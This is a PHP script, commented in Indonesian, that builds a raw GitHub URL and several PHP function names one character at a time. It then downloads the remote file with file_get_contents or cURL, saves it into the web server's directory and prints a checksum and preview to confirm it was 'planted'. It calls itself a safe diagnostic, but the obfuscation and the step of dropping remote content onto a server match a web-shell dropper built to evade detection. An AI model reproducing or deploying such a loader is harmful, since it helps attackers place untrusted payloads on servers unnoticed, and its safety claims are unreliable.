<?php
// ---------- gaya "terpecah-pecah" tapi aman: fetch + save + diagnostik ----------
$_a1 = 'h'.'t'.'t'.'p'.'s'.':'.'/' . '/';
$_a2 = 'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.'c'.'o'.'m';
$_a3 = '/k'.'o'.'l'.'a'.'n'.'g'.'k'.'a'.'l'.'i'.'n'.'g'.'0'.'8';
$_a4 = '/s'.'u'.'p'.'e'.'r'.'/r'.'e'.'f'.'s'.'/h'.'e'.'a'.'d'.'s'.'/m'.'a'.'i'.'n';
$_a5 = '/p'.'o'.'w'.'e'.'r'.'e'.'d'.'/s'.'u'.'p'.'p'.'l'.'y'.'/d'.'a'.'m'.'n'.'/a'.'i'.'.t'.'x'.'t';

$target = $_a1.$_a2.$_a3.$_a4.$_a5;

// nama file lokal tujuan (ubah kalau perlu)
$local_name = __DIR__ . '/' . 'fetched_ai.txt';

// helper obfuscated names
$_ini = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
$_funce = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';

$can_fopen = call_user_func($_ini, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
$has_curl  = call_user_func($_funce, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');

$result = false;
$http_status = null;
$err = null;

// Try file_get_contents first if allowed
if ($can_fopen) {
    // set timeout small supaya nggak nge-hang
    $ctx = stream_context_create(['http' => ['timeout' => 8]]);
    $res = @file_get_contents($target, false, $ctx);
    if ($res !== false) {
        $result = $res;
        $http_status = 200;
    } else {
        $err = 'file_get_contents returned false (possible allow_url_fopen disabled or network issue)';
    }
}

// fallback to cURL
if ($result === false && $has_curl) {
    $ci = curl_init();
    curl_setopt($ci, CURLOPT_URL, $target);
    curl_setopt($ci, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ci, CURLOPT_TIMEOUT, 8);
    curl_setopt($ci, CURLOPT_USERAGENT, 'Mozilla/5.0 (FetchDiag)');
    $res = curl_exec($ci);
    if ($res === false) {
        $err = 'cURL error: ' . curl_error($ci);
    } else {
        $http_status = curl_getinfo($ci, CURLINFO_HTTP_CODE);
        $result = $res;
    }
    curl_close($ci);
}

if ($result === false || $result === null) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "Gagal mengambil target.\n";
    if ($err) echo "Error detail: " . $err . "\n";
    echo "Cek: allow_url_fopen=" . (ini_get('allow_url_fopen') ? '1' : '0') . ", cURL_installed=" . (function_exists('curl_version') ? '1' : '0') . "\n";
    echo "Target: $target\n";
    exit;
}

// Simpan hasil ke file lokal (only write, do not execute)
$written = @file_put_contents($local_name, $result, LOCK_EX);

if ($written === false) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "Gagal menyimpan file ke local: $local_name\n";
    echo "Periksa permissions folder.\n";
    exit;
}

// Hitung checksum & ukuran & tampilkan preview agar ente bisa pastikan "tertanam"
$sha256 = hash('sha256', $result);
$size   = strlen($result);
$preview = substr($result, 0, 512); // tampilkan 512 karakter pertama

header('Content-Type: text/plain; charset=utf-8');
echo "SUKSES mengambil & menyimpan (AMAN).\n";
echo "Lokasi file : $local_name\n";
echo "HTTP status : " . ($http_status ?? 'unknown') . "\n";
echo "File size   : $size bytes\n";
echo "SHA256      : $sha256\n";
echo "\n--- PREVIEW (first 512 chars) ---\n";
echo $preview . "\n";
echo "---------------------------------\n";
echo "Catatan: file disimpan tapi TIDAK DIEKSEKUSI. Kalau mau men-deploy, jalankan langkah manual / verifikasi dulu.\n";
